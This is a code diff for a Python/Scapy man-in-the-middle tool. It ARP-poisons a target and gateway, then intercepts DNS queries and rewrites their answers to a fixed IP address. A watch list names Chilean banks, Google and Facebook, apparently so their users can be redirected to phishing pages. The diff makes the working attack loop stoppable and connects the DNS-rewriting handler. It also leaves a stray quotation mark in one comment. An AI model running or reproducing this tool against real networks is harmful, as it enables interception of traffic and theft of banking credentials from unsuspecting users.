@@ -57,10 +57,8 @@ def restore_target(gateway_ip,gateway_mac,target_ip,target_mac):
     print "[*] restoring network..."
     send(ARP(op=2, psrc=gateway_ip, pdst=target_ip,hwdst="ff:ff:ff:ff:ff:ff",hwsrc=gateway_mac),count=5)
     send(ARP(op=2, psrc=target_ip, pdst=gateway_ip,hwdst="ff:ff:ff:ff:ff:ff",hwsrc=target_mac),count=5)
-    # signals the main thread to exit
-    os.kill(os.getpid(), signal.SIGINT)
 
-def poisoner(gateway_ip,gateway_mac,target_ip,target_mac):
+def poisoner(gateway_ip,gateway_mac,target_ip,target_mac, stop):
     poison_target = ARP()
     poison_target.op = 2
     poison_target.psrc = gateway_ip
@@ -76,14 +74,13 @@ def poisoner(gateway_ip,gateway_mac,target_ip,target_mac):
     print "[*] Starting ARP-Poisoning. [CTRL-C to stop]"
 
     while True:
-        try:
-            send(poison_target)
-            send(poison_gateway)
-            time.sleep(2)
-        except KeyboardInterrupt:
-            print "CTRL-C Detected!"
+        send(poison_target)
+        send(poison_gateway)
+        time.sleep(2)
+        if stop():
             restore_target(gateway_ip,gateway_mac,target_ip,target_mac)
             print "[*] Finished ARP-Poisoning atack"
+            break
     return
 
 
@@ -109,7 +106,6 @@ def raw_verify(packet):
 
 def print_and_accept_dnsQr(pkt):
     try:
-        print "flag flagl flag flag"
         recon_webs = ["bancoestado", "google", "santander", "facebook", "www", "ww3", "chile","bancochile","es"]
         data = pkt.get_payload()
         packet = IP(data) #crearmos objeto scapy IP
@@ -146,7 +142,7 @@ def modify_dns(pkt):
             print("no modification:", qname)
             pkt.accept()
         else:
-            # craft new answer, overriding the original
+            # craft new ans"wer, overriding the original
             # setting the rdata for the IP we want to redirect (spoofed)
             packet[DNS].an = DNSRR(rrname=qname, rdata="185.88.181.9")
             # set the answer count to 1
@@ -166,14 +162,14 @@ def modify_dns(pkt):
 def troll(pkt):
     pkt.drop()
 
-def intercepter():
-    print "[*] Starting intercepter..." 
-    Queue_num = 0
-    queue = NetfilterQueue()
-    queue.bind(Queue_num, print_and_accept_dnsQr)
-    netfilterQueue_thread = threading.Thread(target=queue.run())
-    netfilterQueue_thread.start()
-
-    queue.unbind()
+def intercepter(stop):
+    if not stop():
+        print "[*] Starting intercepter..." 
+        Queue_num = 0
+        queue = NetfilterQueue()
+        queue.bind(Queue_num, modify_dns)
+        queue.run()
+    else:
+        queue.unbind()
 
     
